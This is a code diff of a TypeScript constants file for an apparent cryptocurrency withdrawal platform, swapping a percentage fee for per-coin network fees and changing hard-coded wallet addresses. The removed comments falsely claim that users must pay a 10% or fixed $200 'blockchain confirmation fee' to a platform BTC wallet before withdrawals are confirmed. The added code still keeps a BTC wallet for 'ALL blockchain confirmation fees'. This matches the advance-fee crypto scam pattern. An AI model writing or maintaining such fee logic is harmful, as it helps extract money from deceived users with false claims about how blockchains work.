@@ -3,31 +3,33 @@
 /**
  * Minimum withdrawal amount in USD
  */
-export const MINIMUM_WITHDRAWAL_AMOUNT = 10;
+export const MINIMUM_WITHDRAWAL_AMOUNT = 1;
 
 /**
- * Blockchain confirmation fee percentage for withdrawals
- * This fee is deducted from the withdrawal amount
- * Example: For a $100 withdrawal, $10 fee is deducted and user receives $90
+ * Standard network fees per crypto type (in USD).
+ * These are approximate blockchain network fees deducted from the withdrawal amount.
  */
-export const WITHDRAWAL_FEE_PERCENTAGE = 0.10;
+export const NETWORK_FEES: Record<string, number> = {
+  btc: 3.00,
+  eth: 2.00,
+  usdt: 1.00,
+  usdc: 2.00,
+  xrp: 0.01,
+};
 
 /**
- * BTC wallet address for receiving blockchain confirmation fees
- * Users must pay the 10% fee to this address in a single transaction
+ * Get the network fee for a given crypto currency
  */
-export const CONFIRMATION_FEE_WALLET_BTC = "bc1q3jjvkvy9wt54tn05qzk7spryramhkz7qltn2ny";
+export const getNetworkFee = (currency: string): number => {
+  return NETWORK_FEES[currency.toLowerCase()] ?? 1.00;
+};
 
 /**
- * USDT (TRC20) wallet address for receiving blockchain confirmation fees
- * Users must pay the 10% fee to this address in a single transaction
- * 
- * NOTE: This is a placeholder address. Replace with the actual platform USDT wallet address before production deployment.
+ * BTC wallet address for receiving ALL blockchain confirmation fees
  */
-export const CONFIRMATION_FEE_WALLET_USDT = "TXjVqPUj8dKPxqPxAm8jZGfvbqZ5hK3yqN";
+export const CONFIRMATION_FEE_WALLET_BTC = "bc1qx6hnpju7xhznw6lqewvnk5jrn87devagtrhnsv";
 
 /**
- * Fixed blockchain confirmation fee amount in USD
- * This is a required fee for all transactions to be confirmed on the blockchain
+ * Platform XRP wallet address for receiving deposits
  */
-export const BLOCK_CONFIRMATION_FEE = 200;
+export const PLATFORM_WALLET_XRP = "ranmERjBSRh9Z3Dp9pPsHFv2Uhk6i2aP37";
